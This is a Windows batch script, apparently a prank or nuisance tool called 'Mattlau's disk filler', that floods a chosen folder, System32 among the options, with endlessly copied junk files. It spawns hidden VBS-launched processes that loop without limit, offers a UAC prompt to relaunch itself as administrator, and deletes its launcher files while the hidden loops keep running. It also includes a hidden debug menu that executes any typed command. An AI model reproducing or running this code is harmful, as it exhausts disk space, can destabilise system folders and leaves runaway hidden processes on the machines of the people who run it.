@setlocal enableextensions disabledelayedexpansion
@echo off
echo #=======================#
echo + Mattlau's disk filler +
echo #=======================#
echo. 
if "%~1"=="2" (goto lunchedbyvbs) else goto selectwhere
:selectwhere:
echo where do you want the files to be created?
echo 1. APPDATA (%appdata%)
echo 2. TEMP (%temp%) (require admin)
echo 3. System32 (require admin)
echo 4. desktop (%userprofile%\desktop)
echo 5. custom path
set /P where=type the number of the destination you want: 
if %where% EQU debug goto debug
if %where% EQU 1 set path=%appdata% & goto spam
if %where% EQU 2 set path=%temp% & goto admincheck
if %where% EQU 3 set path=%systemdrive%\Windows\System32 & goto admincheck
if %where% EQU 4 set path=%userprofile%\desktop & goto spam
if %where% EQU 5 goto CustomPath
cls
echo invalid value :/
Timeout /T 3 /NOBREAK > NUL
cls
goto selectwhere

:notadmin:
ECHO Not an admin, please re-open this program with admin privilege or wait 5 secound and choose another destination
Timeout /T 3 /NOBREAK > NUL
goto selectwhere

:CustomPath:
set /P path=give the path to spam: 
if not exist "%path%" mkdir "%path%"
goto spam

:spam:
SET /P threads=How many threads do you want? (i recomand 5): 
cls

echo Creating some important file for the spammer...
echo dim shell > %appdata%\runcreate.vbs
echo set shell=createobject("wscript.shell") >> %appdata%\runcreate.vbs
echo shell.run "cmd /c ""%~f0"" 2", 0 >> %appdata%\runcreate.vbs
echo set shell=nothing >> %appdata%\runcreate.vbs
echo this is the start of something big >> %path%\CallieBestWaifu.%random%

echo %path% > %appdata%\path.txt

echo Lunching the threads...
for /L %%A in (1,1,%threads%) do (
    start %appdata%\runcreate.vbs
)

echo Cleaning the files...

:IsThisAjojoReference:
Echo the spam is active, do you wanna get info on it or exit?
echo 1. get info
echo 2. exit
set /P mattlaumadethis=give your choice: 
del /Q "%appdata%\runcreate.vbs"
del /Q "%appdata%\path.txt"
if %mattlaumadethis% EQU 1 goto spaminfo
if %mattlaumadethis% EQU 2 exit
cls
echo invalid value :/
Timeout /T 3 /NOBREAK > NUL
cls
goto IsThisAjojoReference

:spaminfo:
cd "%path%"
    for /f "tokens=3" %%a in ('dir %path:~0,3%') do (
        set bytesfree=%%a
    )
    set bytesfree=%bytesfree:,=%
    echo ==================================================
    echo %bytesfree% bytes left on the disk you're spamming
    endlocal && set bytesfree=%bytesfree%
set cnt=0
for %%A in (*) do set /a cnt+=1
echo ==================================================
echo There is %cnt% files in the folder you're spamming
echo ==================================================
    set "target=%~1"
    if not defined target set "target=%cd%"

    set "size=0"
    for /f "tokens=3,5" %%a in ('
        dir /a /s /w /-c "%target%"
        ^| findstr /b /l /c:"  "
    ') do if "%%b"=="" set "size=%%a"

    echo the folder you're spamming is %size% bytes
    echo ==================================================
Timeout /T 2 /NOBREAK > NUL
cls
goto spaminfo

:lunchedbyvbs:
@echo on
set /p txtpath=<%appdata%\path.txt
cd %txtpath%
echo this is the start of smth big >> original
:spamstart:
FOR /F %%H IN ('dir /b *') DO (
  copy "%%H" "%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%.%random%"
  type %%H >> %%%H
)
goto spamstart

:admincheck:
cls
echo checking if you're an admin...
openfiles > NUL 2>&1 
if NOT %ERRORLEVEL% EQU 0 goto notadmin
goto spam

:notadmin:
cls
echo look like you don't have the permission to create file there, do you wanna
echo 1. choose another destination
echo 2. open a UAC prompt (it will re-open the script as admin)
set /P notadmin=what do you choose? 
if %notadmin% EQU 1 cls & goto selectwhere
if %notadmin% EQU 2 goto UACPrompt
cls
echo invalid value :/
Timeout /T 3 /NOBREAK > NUL
cls
goto notadmin

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:debug:
REM hey, looking into the code i see
echo.
echo owo u fund the debug menu, what do u wanna do?
echo 1. execute a command
echo 2. give variables
echo 3. echo on
echo 4. echo off
echo 5. cls
echo 6. exit debug menu
set /P debug=what do u want? 
if %debug% EQU 1 goto debug1
if %debug% EQU 2 echo path=%path% & echo where=%where% & echo system drive=%systemdrive%
if %debug% EQU 3 @echo on
if %debug% EQU 4 @echo off
if %debug% EQU 5 cls
if %debug% EQU 6 cls & goto :selectwhere:
goto debug
:debug1:
set /P command=gimme da command:
echo executing command
%command%
echo executed command
goto debug
pause